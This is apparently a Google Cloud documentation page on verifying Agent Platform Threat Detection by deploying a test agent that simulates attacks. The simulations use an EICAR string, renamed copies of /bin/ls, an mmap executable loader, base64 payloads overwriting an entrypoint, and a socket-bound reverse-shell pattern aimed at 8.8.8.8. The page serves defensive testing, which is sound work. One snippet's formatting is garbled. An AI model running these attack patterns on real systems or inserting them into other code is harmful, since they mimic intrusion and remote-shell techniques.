---
url: https://docs.cloud.google.com/security-command-center/docs/how-to-test-agent-platform-threat-detection/
title: Test Agent Platform Threat Detection \u00a0|\u00a0 Security Command Center \u00a0|\u00a0 Google Cloud Documentation
method: scrapling+scrapegraph
fetched_at: 2026-10-23T11:32:26.781490+00:00
---

# Test Agent Platform Threat Detection  |  Security Command Center  |  Google Cloud Documentation

> Source: https://docs.cloud.google.com/security-command-center/docs/how-to-test-agent-platform-threat-detection/

  * [ Home ](https://docs.cloud.google.com/)
  * [ Documentation ](https://docs.cloud.google.com/docs)
  * [ Security ](https://docs.cloud.google.com/docs/security)
  * [ Security Command Center ](https://docs.cloud.google.com/security-command-center/docs)
  * [ Guides ](https://docs.cloud.google.com/security-command-center/docs/security-command-center-overview)



Send feedback 

#  Test Agent Platform Threat Detection Stay organized with collections  Save and categorize content based on your preferences. 

Premium and Enterprise (Deprecated) [service tiers](https://docs.cloud.google.com/security-command-center/docs/service-tiers) The Security Command Center Enterprise service tier will shut down on May 21, 2027. If your organization uses the Enterprise service tier, then the organization will automatically move to the Premium service tier on or after May 21, 2027. Contact your account representative or a [Google Cloud sales specialist](https://cloud.google.com/contact) if you have questions. 

This page explains how to verify that Agent Platform Threat Detection is working by intentionally triggering detectors and checking for findings. Agent Platform Threat Detection is a built-in service of Security Command Center.

## Before you begin

To detect potential threats to your Agent Runtime agents, ensure that the **Agent Platform Threat Detection** [service is enabled](https://docs.cloud.google.com/security-command-center/docs/use-agent-engine-threat-detection#enable-disable) in Security Command Center.

## Set up environment

To test Agent Platform Threat Detection, set up a demo agent that simulates malicious activity.

### Create project and activate shell

Select or create a Google Cloud project to use for testing.

To test detectors, you can use the Google Cloud console and Cloud Shell.

  1. Go to the [Google Cloud console](https://console.cloud.google.com/projectselector2).

[Go to the Google Cloud console](https://console.cloud.google.com/projectselector2)

  2. Select the project that you will use to test.

  3. Click **Activate Cloud Shell**. ![](https://docs.cloud.google.com/static/security-command-center/images/activate-cloud-shell.svg)




You can also run the testing instructions from a local shell.

### Set up Agent Runtime

If you haven't used Agent Runtime in this project before, [Set up the Agent Runtime environment](https://docs.cloud.google.com/agent-builder/agent-engine/set-up) before starting. Record the name of the Cloud Storage staging bucket that you created. We also recommend that you follow the [Agent Runtime quickstart](https://docs.cloud.google.com/agent-builder/agent-engine/quickstart-adk) to learn how to develop and deploy an agent with the Vertex AI SDK.

### Create test script

You will create several files that will be used to deploy a new agent for testing. Use a text editor for this, such as `nano`.

  1. Create a new file named `requirements.txt` with the following contents.
         
         google-cloud-aiplatform[agent_engines]
         google-adk
         google-genai
         aiohttp
         cloudpickle
         pydantic
         

  2. Create a new empty file called `installation_scripts/install.sh`. Some tests require adding content to this file.

  3. Create a new file called `main.py`, with the following contents. Replace the `PROJECT_ID`, `LOCATION`, and `STAGING_BUCKET` variables. The staging bucket name must include the `gs://` prefix.
         
         import asyncio
         import os
         import subprocess
         import socket
         import [vertexai](https://docs.cloud.google.com/python/docs/reference/agentplatform/latest)
         from vertexai import Client, [agent_engines](https://docs.cloud.google.com/python/docs/reference/agentplatform/latest/vertexai._genai.agent_engines.html)
         from google.adk.agents import llm_agent
         from google.adk.sessions.in_memory_session_service import InMemorySessionService
         
         # Replace with your own project, location, and staging bucket.
         LOCATION = "LOCATION"
         PROJECT_ID = "PROJECT_ID"
         # Staging bucket must have gs:// prefix
         STAGING_BUCKET = "STAGING_BUCKET"
         
         client = Client(project=PROJECT_ID, location=LOCATION)
         
         def _run_command(args, **kwargs):
           output = f"Called {' '.join(args)}\n"
           try:
             res = subprocess.[run](https://docs.cloud.google.com/python/docs/reference/agentplatform/latest/vertexai.resources.preview.ml_monitoring.ModelMonitor.html#vertexai_resources_preview_ml_monitoring_ModelMonitor_run)(args, capture_output=True, text=True, **kwargs)
             if res.stdout:
               output += f"Result: {res.stdout.strip()}\n"
             if res.stderr:
               output += f"Error: {res.stderr.strip()}\n"
           except subprocess.TimeoutExpired:
             output += "Command timed out as expected."
           return output
         
         # Tool to simulate threats. The function body will be replaced for individual
         # detector tests.
         def threat_detection_test():
           output = _run_command(["sleep", "60"])
           output += _run_command(["echo", "this is a fake threat"])
           output += _run_command(["sleep", "10"])
           return output
         
         root_agent = llm_agent.Agent(
             model="gemini-2.5-flash",
             name="threat_detection_test_agent",
             description="Runs threat detection test.",
             instruction="""
               You are an agent that runs a threat detection test using a fake malicious
               command.
             """,
             tools=[threat_detection_test],
         )
         
         async def main():
           [vertexai](https://docs.cloud.google.com/python/docs/reference/agentplatform/latest).init(
             project=PROJECT_ID,
             location=LOCATION,
             staging_bucket=STAGING_BUCKET,
           )
           app = [agent_engines](https://docs.cloud.google.com/python/docs/reference/agentplatform/latest/vertexai._genai.agent_engines.html).[AdkApp](https://docs.cloud.google.com/python/docs/reference/agentplatform/latest/vertexai.preview.reasoning_engines.AdkApp.html)(
               agent=root_agent, session_service_builder=InMemorySessionService
           )
           remote_agent = client.[agent_engines](https://docs.cloud.google.com/python/docs/reference/agentplatform/latest/vertexai._genai.agent_engines.html).create(
               agent=app,
               config={
                   "display_name": "scc_threat_test_agent",
                   "identity_type": [vertexai](https://docs.cloud.google.com/python/docs/reference/agentplatform/latest).[types](https://docs.cloud.google.com/python/docs/reference/agentplatform/latest/vertexai._genai.types.html).[IdentityType](https://docs.cloud.google.com/python/docs/reference/agentplatform/latest/vertexai._genai.types.IdentityType.html).[AGENT_IDENTITY](https://docs.cloud.google.com/python/docs/reference/agentplatform/latest/vertexai._genai.types.IdentityType.html#vertexai__genai_types_IdentityType_AGENT_IDENTITY),
                   "requirements": [
                       "google-cloud-aiplatform[agent_engines,adk]",
                       "cloudpickle",
                       "pydantic",
                   ],
                   "staging_bucket": STAGING_BUCKET,
                   "extra_packages": [
                       "installation_scripts/install.sh",
                   ],
               },
           )
           print("Deployed agent: ", remote_agent.api_resource.name)
         
           try:
               async for event in remote_agent.[async_stream_query](https://docs.cloud.google.com/python/docs/reference/agentplatform/latest/vertexai.preview.reasoning_engines.AdkApp.html#vertexai_preview_reasoning_engines_AdkApp_async_stream_query)(
                   user_id="threat_detection_tester",
                   message="Run the threat detection test",
               ):
                 print(event)
           finally:
               client.[agent_engines](https://docs.cloud.google.com/python/docs/reference/agentplatform/latest/vertexai._genai.agent_engines.html).delete(name=remote_agent.api_resource.name, force=True)
         
         if __name__ == "__main__":
           asyncio.[run](https://docs.cloud.google.com/python/docs/reference/agentplatform/latest/vertexai.resources.preview.ml_monitoring.ModelMonitor.html#vertexai_resources_preview_ml_monitoring_ModelMonitor_run)(main())
         




### Set up virtual environment

  1. Create and activate a Python virtual environment.
         
         python3 -m venv env
           source env/bin/activate
         

  2. Install necessary dependencies in the virtual environment.
         
         pip install -r requirements.txt
         




### Test the script

Run the script from inside the virtual environment with `python3 main.py`. This command will take several minutes to build, deploy, and execute the test agent.

The script outputs the resource name of the deployed agent, and a few JSON objects including an LLM response and other metadata. If you encounter permission errors or deployment errors at this stage, consult [troubleshooting](https://docs.cloud.google.com/agent-builder/agent-engine/troubleshooting/deploy) for next steps.

## Test detectors

To test Agent Platform Threat Detection detectors, replace the code in the `threat_detection_test` function with code that simulates an attack. The script can take a long time to deploy and query the agent. To speed up testing, you can combine the contents of several of these functions together.

### Execution: Added Malicious Binary Executed

Replace the `threat_detection_test` function in the test script, and then run the test script.
    
    
    def threat_detection_test():
      output = _run_command(["sleep", "60"])
      eicar = r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
      output += _run_command(["touch", "/tmp/test_mal_file"])
      with open("/tmp/test_mal_file", "w") as f:
        f.write(eicar)
      output += _run_command(["chmod", "700", "/tmp/test_mal_file"])
      output += _run_command(["sh", "-c", "/tmp/test_mal_file"])
      output += _run_command(["sleep", "10"])
      return output
    

### Execution: Added Malicious Library Loaded

Replace the `threat_detection_test` function in the test script, and then run the test script. You might receive an error from the Vertex AI SDK about parsing the response, but the finding is still generated.
    
    
    def threat_detection_test():
      output = _run_command(["sleep", "60"])
      eicar = r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
      with open("/tmp/test_mal_lib", "w") as f:
        f.write(eicar)
      with open("/tmp/loader.c", "w") as f:
        f.write("""
          #include <fcntl.h>
          #include <sys/mman.h>
          #include <sys/stat.h>
          #include <unistd.h>
          #include <stdlib.h>
          int main(int argc, char *argv[]) {
             int fd = open(argv[1], O_RDONLY);
             struct stat sb;
             fstat(fd, &sb);
             void* addr = mmap(NULL, sb.st_size, PROT_EXEC, MAP_PRIVATE, fd, 0);
             write(1, addr, sb.st_size);
             munmap(addr, sb.st_size);
             close(fd);
             return 0;
          }
        """)
      output += _run_command(["gcc", "/tmp/loader.c", "-o", "/tmp/loader"])
      output += _run_command(["/tmp/loader", "/tmp/test_mal_lib"])
      output += _run_command(["sleep", "10"])
      return output
    

### Execution: Container Escape

Replace the `threat_detection_test` function in the test script, and then run the test script.
    
    
    def threat_detection_test():
      output = _run_command(["sleep", "60"])
      output += _run_command(["cp", "/bin/ls", "/tmp/botb-linux-amd64"])
      output += _run_command(["chmod", "700", "/tmp/botb-linux-amd64"])
      output += _run_command(["/tmp/botb-linux-amd64", "-autopwn"])
      output += _run_command(["sleep", "10"])
      return output
    

### Execution: Kubernetes Attack Tool Execution

Replace the `threat_detection_test` function in the test script, and then run the test script.
    
    
    def threat_detection_test():
      output = _run_command(["sleep", "60"])
      output += _run_command(["cp", "/bin/ls", "/tmp/amicontained"])
      output += _run_command(["/tmp/amicontained"])
      output += _run_command(["sleep", "10"])
      return output
    

### Execution: Local Reconnaissance Tool Execution

Replace the `threat_detection_test` function in the test script, and then run the test script.
    
    
    def threat_detection_test():
      output = _run_command(["sleep", "60"])
      output += _run_command(["cp", "/bin/ls", "/tmp/linenum.sh"])
      output += _run_command(["/tmp/linenum.sh"])
      output += _run_command(["sleep", "10"])
      return output
    

### Execution: Modified Malicious Binary Executed
    
    
    Replace the `threat_detection_test` function in the test script, and then run the
    test script.
    
    ```python
    def threat_detection_test():
        eicar = r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
        output = _run_command(["sleep", "60"])
        output += _run_command(["chmod", "-R", "777", "/code"])
        with open("/code/entrypoint.sh", "w") as f:
    f.write(eicar)
    

output += _run_command(["chmod", "700", "/code/entrypoint.sh"]) output += _run_command(["sh", "-c", "/code/entrypoint.sh"]) output += _run_command(["sleep", "10"]) return output ```

### Execution: Modified Malicious Library Loaded

Replace the `threat_detection_test` function in the test script, and then run the test script.
    
    
    def threat_detection_test():
      eicar = r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
      output = _run_command(["sleep", "60"])
      output += _run_command(["chmod", "-R", "777", "/code"])
      with open("/code/entrypoint.sh", "w") as f:
        f.write(eicar)
      with open("/tmp/loader.c", "w") as f:
        f.write("""
          #include <fcntl.h>
          #include <sys/mman.h>
          #include <sys/stat.h>
          #include <unistd.h>
          #include <stdlib.h>
          int main(int argc, char *argv[]) {
             int fd = open(argv[1], O_RDONLY);
             struct stat sb;
             fstat(fd, &sb);
             void* addr = mmap(NULL, sb.st_size, PROT_EXEC, MAP_PRIVATE, fd, 0);
             write(1, addr, sb.st_size);
             munmap(addr, sb.st_size);
             close(fd);
             return 0;
          }
        """)
      output += _run_command(["gcc", "/tmp/loader.c", "-o", "/tmp/loader"])
      output += _run_command(["/tmp/loader", "/code/entrypoint.sh"])
      output += _run_command(["sleep", "10"])
      return output
    

### Execution: Added Malicious Skill Executed

These Malicious Skill Execution detections are slightly different from other detectors. Instead of defining the logic fully inside `threat_detection_test`, wrap `threat_detection_test` in a Python factory function. The Python tool script will load a test payload using a `B64_PAYLOAD` environment variable instead of hard-coding it into the script. Ensure you export the `B64_PAYLOAD` in your shell terminal.
    
    
    export B64_PAYLOAD=$(echo 'int main(){/*Malicious Skill Test*/return 0;}' > dummy.c && export SOURCE_DATE_EPOCH=1600000000 && gcc -ffile-prefix-map="$(pwd)=." -Wl,--build-id=none dummy.c -o dummy && base64 -w 0 dummy)
    

Replace the `threat_detection_test` function in the test script with the following `create_threat_tool` function. Update the script initialization code at the bottom of the script to call this tool correctly, passing `local_payload`.
    
    
    import base64
    def create_threat_tool(injected_payload):
        def threat_tool():
            """Runs a threat detection test by writing and executing a base64 encoded payload."""
            output = _run_command(["sleep", "60"])
            test_file = "/tmp/tmp_mal_file"
    
            b64_payload_str = injected_payload
            b64_payload = b64_payload_str.encode('utf-8')
    
            decoded_content = base64.b64decode(b64_payload)
            with open(test_file, "wb") as f:
                f.write(decoded_content)
    
            output += _run_command(["chmod", "700", test_file])
            output += _run_command(["sh", "-c", test_file])
            output += _run_command(["sleep", "10"])
            output += _run_command(["sha256sum", test_file])
            output += _run_command(["rm", test_file])
    
            return output
    
        return threat_tool
    
    
    
    if __name__ == "__main__":
      local_payload = os.environ.get("B64_PAYLOAD")
    
      if not local_payload:
          raise ValueError("Local B64_PAYLOAD environment variable is missing. Export it first.")
    
      threat_tool_instance = create_threat_tool(local_payload)
    
      root_agent = llm_agent.Agent(
          model="gemini-2.5-flash",
          name="threat_detection_test_agent",
          description="Runs threat detection test.",
          instruction="""
            You are an agent that runs multiple threat detection tests using a fake malicious
            command.
          """,
          tools=[
            threat_tool_instance,
          ],
      )
      asyncio.run(main())
    

### Execution: Modified Malicious Skill Executed

Replace the `threat_detection_test` function in the test script with the following `create_modified_threat_tool` function. Replace the script initialization code at the bottom of the script to call this tool correctly, passing `local_payload` as shown in the following example.
    
    
    import base64
    def create_modified_threat_tool(injected_payload):
        def modified_threat_tool():
            """Runs a threat detection test by modifying an existing file with a decoded payload and executing it."""
            output = _run_command(["sleep", "60"])
            target_file = "/code/entrypoint.sh"
    
            b64_payload_str = injected_payload
            b64_payload = b64_payload_str.encode('utf-8')
    
            output += _run_command(["chmod", "777", target_file])
    
            decoded_content = base64.b64decode(b64_payload)
    
            with open(target_file, "wb") as f:
                f.write(decoded_content)
    
            output += _run_command(["chmod", "700", target_file])
            output += _run_command(["sh", "-c", target_file])
            output += _run_command(["sleep", "10"])
    
            return output
    
        return modified_threat_tool
    
    
    
    if __name__ == "__main__":
      local_payload = os.environ.get("B64_PAYLOAD")
    
      if not local_payload:
          raise ValueError("Local B64_PAYLOAD environment variable is missing. Export it first.")
    
      threat_tool_instance = create_modified_threat_tool(local_payload)
    
      root_agent = llm_agent.Agent(
          model="gemini-2.5-flash",
          name="threat_detection_test_agent",
          description="Runs threat detection test.",
          instruction="""
            You are an agent that runs multiple threat detection tests using a fake malicious
            command.
          """,
          tools=[
            threat_tool_instance,
          ],
      )
      asyncio.run(main())
    

### Execution: Added Malicious Skill Loaded

Replace the `threat_detection_test` function in the test script with the following `create_threat_library` function. Replace the script initialization code at the bottom of the script to call this tool correctly, passing `local_payload` as shown in the following example.
    
    
    import base64
    def create_threat_library(injected_payload):
        def threat_library():
            """Simulates loading a malicious library using mmap PROT_EXEC."""
            output = _run_command(["sleep", "60"])
            test_lib_file = "/tmp/test_mal_lib"
            loader_source = "/tmp/loader.c"
            loader_bin = "/tmp/loader"
    
            b64_payload_str = injected_payload
            b64_payload = b64_payload_str.encode('utf-8')
    
            c_loader_code = """
            #include <fcntl.h>
            #include <sys/mman.h>
            #include <sys/stat.h>
            #include <unistd.h>
            #include <stdlib.h>
            int main(int argc, char *argv[]) {
                int fd = open(argv[1], O_RDONLY);
                if (fd == -1) return 1;
                struct stat sb;
                if (fstat(fd, &sb) == -1) return 1;
                void* addr = mmap(NULL, sb.st_size, PROT_EXEC, MAP_PRIVATE, fd, 0);
                if (addr == MAP_FAILED) return 1;
                write(1, addr, sb.st_size);
                munmap(addr, sb.st_size);
                close(fd);
                return 0;
            }
            """
    
            decoded_content = base64.b64decode(b64_payload)
    
            with open(test_lib_file, "wb") as f:
                f.write(decoded_content)
    
            with open(loader_source, "w") as f:
                f.write(c_loader_code)
    
            output += _run_command(["gcc", loader_source, "-o", loader_bin])
            output += _run_command([loader_bin, test_lib_file])
            output += _run_command(["sleep", "10"])
    
            for f_path in [test_lib_file, loader_source, loader_bin]:
                if os.path.exists(f_path):
                    output += _run_command(["rm", f_path])
    
            return output
    
        return threat_library
    
    
    
    if __name__ == "__main__":
      local_payload = os.environ.get("B64_PAYLOAD")
    
      if not local_payload:
          raise ValueError("Local B64_PAYLOAD environment variable is missing. Export it first.")
    
      threat_tool_instance = create_threat_library(local_payload)
    
      root_agent = llm_agent.Agent(
          model="gemini-2.5-flash",
          name="threat_detection_test_agent",
          description="Runs threat detection test.",
          instruction="""
            You are an agent that runs multiple threat detection tests using a fake malicious
            command.
          """,
          tools=[
            threat_tool_instance,
          ],
      )
      asyncio.run(main())
    

### Execution: Modified Malicious Skill Loaded

Replace the `threat_detection_test` function in the test script with the following `create_modified_threat_library` function. Replace the script initialization code at the bottom of the script to call this tool correctly, passing `local_payload` as shown in the following example.
    
    
    import base64
    def create_modified_threat_library(injected_payload):
        def modified_threat_library():
            """Simulates loading a modified existing binary as a library using mmap PROT_EXEC."""
            output = _run_command(["sleep", "60"])
            target_file = "/code/entrypoint.sh"
            loader_source = "/tmp/loader.c"
            loader_bin = "/tmp/loader"
    
            b64_payload_str = injected_payload
            b64_payload = b64_payload_str.encode('utf-8')
    
            c_loader_code = """
            #include <fcntl.h>
            #include <sys/mman.h>
            #include <sys/stat.h>
            #include <unistd.h>
            #include <stdlib.h>
            int main(int argc, char *argv[]) {
                int fd = open(argv[1], O_RDONLY);
                if (fd == -1) return 1;
                struct stat sb;
                if (fstat(fd, &sb) == -1) return 1;
                void* addr = mmap(NULL, sb.st_size, PROT_EXEC, MAP_PRIVATE, fd, 0);
                if (addr == MAP_FAILED) return 1;
                write(1, addr, sb.st_size);
                munmap(addr, sb.st_size);
                close(fd);
                return 0;
            }
            """
    
            output += _run_command(["chmod", "777", target_file])
    
            decoded_content = base64.b64decode(b64_payload)
    
            with open(target_file, "wb") as f:
                f.write(decoded_content)
    
            with open(loader_source, "w") as f:
                f.write(c_loader_code)
    
            output += _run_command(["gcc", loader_source, "-o", loader_bin])
            output += _run_command([loader_bin, target_file])
            output += _run_command(["sleep", "10"])
    
            for f_path in [loader_source, loader_bin]:
                if os.path.exists(f_path):
                    output += _run_command(["rm", f_path])
    
            return output
    
        return modified_threat_library
    
    
    
    if __name__ == "__main__":
      local_payload = os.environ.get("B64_PAYLOAD")
    
      if not local_payload:
          raise ValueError("Local B64_PAYLOAD environment variable is missing. Export it first.")
    
      threat_tool_instance = create_modified_threat_library(local_payload)
    
      root_agent = llm_agent.Agent(
          model="gemini-2.5-flash",
          name="threat_detection_test_agent",
          description="Runs threat detection test.",
          instruction="""
            You are an agent that runs multiple threat detection tests using a fake malicious
            command.
          """,
          tools=[
            threat_tool_instance,
          ],
      )
      asyncio.run(main())
    

### Malicious URL Observed

Update the `installation_scripts/install.sh` file with the following contents.
    
    
    #!/bin/bash
    apt-get install -y curl --no-install-recommends
    

Replace the `threat_detection_test` function in the test script, and then run the test script.
    
    
    def threat_detection_test():
      url = "https://testsafebrowsing.appspot.com/s/malware.html"
      output = _run_command(["sleep", "60"])
      output += _run_command(["curl", url])
      output += _run_command(["sleep", "10"])
      return output
    

### Reverse Shell

Replace the `threat_detection_test` function in the test script, and then run the test script.
    
    
    def threat_detection_test():
      output = _run_command(["sleep", "60"])
      output += _run_command(["cp", "/bin/echo", "/tmp/sh"])
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect(("8.8.8.8", 53))
      subprocess.run(["/tmp/sh"], stdin=s, stdout=s, stderr=s, timeout=5)
      output += _run_command(["sleep", "10"])
      return output
    

## What's next

  * Learn more about [Agent Platform Threat Detection](https://docs.cloud.google.com/security-command-center/docs/agent-engine-threat-detection-overview).
  * Learn how to [use Agent Platform Threat Detection](https://docs.cloud.google.com/security-command-center/docs/use-agent-engine-threat-detection).



Send feedback 

Except as otherwise noted, the content of this page is licensed under the [Creative Commons Attribution 4.0 License](https://creativecommons.org/licenses/by/4.0/), and code samples are licensed under the [Apache 2.0 License](https://www.apache.org/licenses/LICENSE-2.0). For details, see the [Google Developers Site Policies](https://developers.google.com/site-policies). Java is a registered trademark of Oracle and/or its affiliates.

Last updated 2026-10-22 UTC.

Need to tell us more?  [[["Easy to understand","easyToUnderstand","thumb-up"],["Solved my problem","solvedMyProblem","thumb-up"],["Other","otherUp","thumb-up"]],[["Hard to understand","hardToUnderstand","thumb-down"],["Incorrect information or sample code","incorrectInformationOrSampleCode","thumb-down"],["Missing the information/samples I need","missingTheInformationSamplesINeed","thumb-down"],["Other","otherDown","thumb-down"]],["Last updated 2026-10-22 UTC."],[],[]] 
